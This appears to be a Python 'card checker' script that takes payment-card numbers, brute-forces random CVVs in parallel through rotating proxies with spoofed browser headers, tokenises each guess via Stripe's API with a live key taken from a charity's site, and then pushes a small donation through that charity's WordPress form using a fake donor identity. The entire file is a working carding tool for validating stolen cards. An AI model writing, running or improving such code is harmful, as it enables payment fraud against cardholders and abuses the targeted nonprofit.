import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, List
from utils.proxy_manager import ProxyManager
from fake_useragent import UserAgent

class StripeService:
    def __init__(self, proxy_manager: ProxyManager, user_agent: str = None):
        self.proxy_manager = proxy_manager
        self.user_agent = user_agent or UserAgent().random
        self.max_retries = 5  # Maximum number of parallel retries
        self.timeout = 10  # Reduced timeout for faster response

    def generate_cvv_batch(self, count: int = 10) -> List[str]:
        """Generate a batch of random CVVs quickly"""
        return [f"{random.randint(0, 999):03d}" for _ in range(count)]

    def try_single_cvv(self, cc: str, mm: str, yy: str, cvv: str, proxy: dict) -> Optional[str]:
        """Try a single CVV with error handling"""
        try:
            session = requests.Session()
            session.proxies.update(proxy)

            data = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'guid': '15272133-9ede-4e6e-b794-c198bb382765d92456',
                'muid': '22e150f1-15d3-4b99-9666-08e841b7329b5c431b',
                'sid': '2952eb70-08a1-46eb-acf6-cbb91b9f98b949ab7d',
                'pasted_fields': 'number',
                'payment_user_agent': 'stripe.js/0c81e1259e; stripe-js-v3/0c81e1259e; card-element',
                'referrer': 'https://lumivoce.org',
                'time_on_page': '27287',
                'key': 'pk_live_519sODGHwVm9HtpVbGWn3R5HrSXBaErzDUXPjtr2JvODEXgSV8x7UQnU3fChIZ6hlwrgM4ubVpp1DFbUDX74ft4pV00GlpMnrpR',
            }

            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.user_agent,
            }

            response = session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=self.timeout
            )

            if response.ok and 'id' in response.json():
                return response.json()['id']
            return None

        except Exception:
            return None

    def process_payment(self, stripe_id: str, proxy: dict) -> Optional[str]:
        """Process payment with the obtained stripe ID"""
        try:
            session = requests.Session()
            session.proxies.update(proxy)

            headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://lumivoce.org',
                'referer': 'https://lumivoce.org/?ff_landing=4&form=gutterspayment',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': self.user_agent,
            }

            params = {'t': '1718807439228'}
            files = {
                'action': (None, 'fluentform_submit'),
                'data': (None, f'choose_time=One%20Time%20&payment_input=Other%20Amount&custom-payment-amount=110'
                              f'&input_text=Crish%20Niki&email=crishniki158%40gmail.com&payment_method=stripe'
                              f'&__fluent_form_embded_post_id=263&_fluentform_49_fluentformnonce=a73e2da4de'
                              f'&_wp_http_referer=%2Fdonate%2F&__stripe_payment_method_id={stripe_id}'
                              f'&isFFConversational=true'),
                'form_id': (None, '49'),
            }

            response = session.post(
                'https://lumivoce.org/wp-admin/admin-ajax.php',
                params=params,
                headers=headers,
                files=files,
                timeout=self.timeout
            )

            if response.ok:
                return response.text
            return None

        except Exception:
            return None

    def check_card(self, card: str) -> str:
        try:
            cc, mm, yy, original_cvv = card.split("|")
            proxy = self.proxy_manager.get_random_proxy()
            if not proxy:
                return "❌ **Error:** No proxies available"

            # Generate multiple CVVs for parallel processing
            cvvs = self.generate_cvv_batch(10)  # Generate 10 CVVs at once
            successful_result = None

            with ThreadPoolExecutor(max_workers=self.max_retries) as executor:
                # Submit all CVV attempts in parallel
                future_to_cvv = {
                    executor.submit(self.try_single_cvv, cc, mm, yy, cvv, proxy): cvv 
                    for cvv in cvvs
                }

                # Process results as they complete
                for future in as_completed(future_to_cvv):
                    stripe_id = future.result()
                    if stripe_id:
                        # If we get a successful stripe ID, process the payment
                        payment_result = self.process_payment(stripe_id, proxy)
                        if payment_result:
                            successful_result = f"✅ **Stripe ID:** {stripe_id}\n✅ **Response:** {payment_result}"
                            break

            return successful_result or "❌ **Error:** All attempts failed"

        except Exception as e:
            return f"❌ **Error:** {str(e)}"